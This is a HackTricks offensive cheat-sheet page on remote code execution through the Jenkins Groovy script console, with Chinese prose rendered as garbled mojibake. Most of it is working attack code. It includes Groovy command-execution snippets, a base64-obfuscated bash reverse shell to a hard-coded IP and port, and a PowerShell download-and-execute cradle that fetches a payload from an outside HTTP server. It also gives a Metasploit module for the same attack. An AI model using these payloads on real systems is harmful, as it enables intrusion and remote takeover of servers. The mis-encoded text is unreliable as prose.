# Jenkins RCE ä¸ Groovy è„šæœ¬

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºè‹±é›„</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## Jenkins RCE ä¸ Groovy è„šæœ¬

è¿™æ¯”åœ¨ Jenkins ä¸­åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®è¦å°‘å¼•èµ·æ³¨æ„

1. è½¬åˆ° _path\_jenkins/script_
2. åœ¨æ–‡æœ¬æ¡†å†…è¾“å…¥è„šæœ¬
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
```markdown
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œæ“ä½œï¼š`cmd.exe /c dir`

åœ¨ **linux** ä¸­ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š**`"ls /".execute().text`**

å¦‚æœæ‚¨éœ€è¦åœ¨æ–‡æœ¬ä¸­ä½¿ç”¨_å¼•å·_å’Œ_å•å¼•å·_ã€‚æ‚¨å¯ä»¥ä½¿ç”¨_"""PAYLOAD"""_ï¼ˆä¸‰é‡åŒå¼•å·ï¼‰æ¥æ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚

**å¦ä¸€ä¸ªæœ‰ç”¨çš„groovyè„šæœ¬**æ˜¯ï¼ˆæ›¿æ¢\[INSERT COMMAND]ï¼‰ï¼š
```
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### åœ¨ Linux ä¸­çš„åå‘ shell
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### Windows ä¸‹çš„åå‘ shell

æ‚¨å¯ä»¥å‡†å¤‡ä¸€ä¸ªå¸¦æœ‰ PS åå‘ shell çš„ HTTP æœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨ Jeking ä¸‹è½½å¹¶æ‰§è¡Œå®ƒï¼š
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### è„šæœ¬

æ‚¨å¯ä»¥ä½¿ç”¨[**æ­¤è„šæœ¬**](https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_admin_script.py)è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨MSFè·å–åå‘shellï¼š
```
msf> use exploit/multi/http/jenkins_script_console
```
<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
